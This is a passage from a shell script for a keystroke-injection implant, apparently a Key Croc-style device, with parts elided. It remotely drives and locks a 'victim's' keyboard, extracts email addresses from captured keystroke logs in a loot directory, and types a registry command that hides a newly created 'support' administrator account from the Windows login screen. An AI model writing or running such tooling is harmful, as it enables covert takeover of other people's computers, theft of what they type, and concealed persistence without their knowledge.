...
print_remote_help() {
	echo "Remote keyboard - shortcuts"
	echo ""
	echo "  F2        exit"
	echo "  ALT+r     Win+R"
	echo "  ALT+d     show desktop"
	echo "  ALT+9     open terminal"
	echo "  ALT+4     close window"
	echo "  ALT+T     Alt+Tab"
	echo "  ALT+u/o   unlock / lock victim's keyboard"
	echo ""
}
...
run_remote() {
	...
	echo ""
	echo "Active. Press F2 to exit."
	echo ""

	while read_key; do
		case "$key" in
			$'\e'"${fkey[2]}")  quack UNLOCK; stty echo; echo; return ;;
			...
			$'\er')   quack GUI r         ; echo -n " WIN+R "    ;;
			$'\ed')   quack GUI d         ; echo -n " DESKTOP "  ;;
			$'\e9')   quack CONTROL-ALT-t ; echo -n " TERMINAL " ;;
			$'\e4')   quack ALT-F4        ; echo -n " CLOSE "    ;;
			$'\eT')   quack ALT-TAB       ; echo -n " ALT+TAB "  ;;
			$'\eu')   quack UNLOCK        ; echo -n " UNLOCK "   ;;
			$'\eo')   quack LOCK          ; echo -n " LOCK "     ;;
			$'\ex')   quack GUI x         ; echo -n " WIN+X "    ;;
			$'\e0')   quack GUI           ; echo -n " WIN "      ;;
			$'\ez')   quack CONTROL-z     ; echo -n " CTRL+Z "   ;;
...
run_emails() {
	...
	found=$(find "$LOOT_DIR" /root/loot -name "croc_char.log" \
		-exec sed 's/\[[^]]*\]//g' {} + 2>/dev/null \
		| grep -oE '[a-zA-Z0-9._]{3,}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' \
		| sort -u)
...
run_hidden_admin() {
	...
	quack STRING "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v support /t REG_DWORD /d 0 /f"
	quack ENTER
	sleep 1
